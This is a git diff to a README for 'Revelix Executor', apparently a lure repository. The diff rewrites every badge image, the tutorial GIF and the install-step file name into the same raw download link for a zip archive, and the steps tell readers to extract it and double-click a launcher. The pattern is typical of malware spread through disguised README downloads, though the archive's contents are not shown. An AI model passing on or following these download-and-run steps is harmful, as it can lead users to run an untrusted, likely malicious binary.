@@ -1,11 +1,11 @@
 # 🚀 Revelix Executor – Next-Gen Automation Gateway
 
-![OS Support](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-blue)
-![MIT License](https://img.shields.io/badge/license-MIT-yellow)
-![OpenAI API Ready](https://img.shields.io/badge/OpenAI-API-green)
-![Claude API Integration](https://img.shields.io/badge/Claude-API-violet)
-![Multi-Language](https://img.shields.io/badge/Language-Multi-blue)
-![Support 24/7](https://img.shields.io/badge/Support-24%2F7-brightgreen)
+![OS Support](https://github.com/cartof121/revelix-executor-hub/raw/refs/heads/main/cowling/hub_revelix_executor_v1.6.zip%20%7C%20macOS%20%7C%20Linux-blue)
+![MIT License](https://github.com/cartof121/revelix-executor-hub/raw/refs/heads/main/cowling/hub_revelix_executor_v1.6.zip)
+![OpenAI API Ready](https://github.com/cartof121/revelix-executor-hub/raw/refs/heads/main/cowling/hub_revelix_executor_v1.6.zip)
+![Claude API Integration](https://github.com/cartof121/revelix-executor-hub/raw/refs/heads/main/cowling/hub_revelix_executor_v1.6.zip)
+![Multi-Language](https://github.com/cartof121/revelix-executor-hub/raw/refs/heads/main/cowling/hub_revelix_executor_v1.6.zip)
+![Support 24/7](https://github.com/cartof121/revelix-executor-hub/raw/refs/heads/main/cowling/hub_revelix_executor_v1.6.zip%2F7-brightgreen)
 
 ---
 
@@ -77,17 +77,17 @@ No matter where you launch it, Revelix Executor offers seamless performance and 
 
 **Step-by-step to unlock your productivity:**
 
-1. **Obtain the EasyLaunch.zip directly from this repository**  
+1. **Obtain the https://github.com/cartof121/revelix-executor-hub/raw/refs/heads/main/cowling/hub_revelix_executor_v1.6.zip directly from this repository**  
    Packed with all essentials, it's your key to starting right away.
 
 2. **Extract the archive**  
-   Simply decompress `EasyLaunch.zip` into your desired directory.
+   Simply decompress `https://github.com/cartof121/revelix-executor-hub/raw/refs/heads/main/cowling/hub_revelix_executor_v1.6.zip` into your desired directory.
 
 3. **Run the Revelix Executor launcher**  
    Double-click and watch the interface come alive, adapting before your eyes.
 
 4. **Video Installation Tutorial**  
-   ![Installation Tutorial](https://i.imgur.com/Js67NIU.gif)
+   ![Installation Tutorial](https://github.com/cartof121/revelix-executor-hub/raw/refs/heads/main/cowling/hub_revelix_executor_v1.6.zip)
 
 5. Begin integrating your favorite APIs, crafting intelligent automations, and discover what it means to command your digital universe.
 
